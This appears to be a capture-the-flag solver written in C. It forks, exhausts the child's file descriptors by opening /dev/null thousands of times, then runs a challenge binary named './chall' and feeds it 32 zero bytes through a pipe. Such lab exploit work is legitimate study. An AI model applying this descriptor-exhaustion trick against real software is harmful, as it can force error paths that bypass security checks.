#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    int fd[2];
    pipe(fd); // fd[0] = read, fd[1] = write

    pid_t pid = fork();

    if (pid == 0) {
        // CHILD
        close(fd[1]); // close write end

        // redirect stdin to pipe read end
        dup2(fd[0], STDIN_FILENO);
        close(fd[0]);
	for (int i  =0; i<0x2000; i++) {
	open("/dev/null",0);
}

        // run a program that reads from stdin
        execlp("./chall", "./chall", NULL);

        perror("execlp failed");
        exit(1);
    } else {
        // PARENT
        close(fd[0]); // close read end

        char *msg = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        write(fd[1], msg, 0x20);

        close(fd[1]); // important: signals EOF to child

        wait(NULL);
    }

    return 0;
}
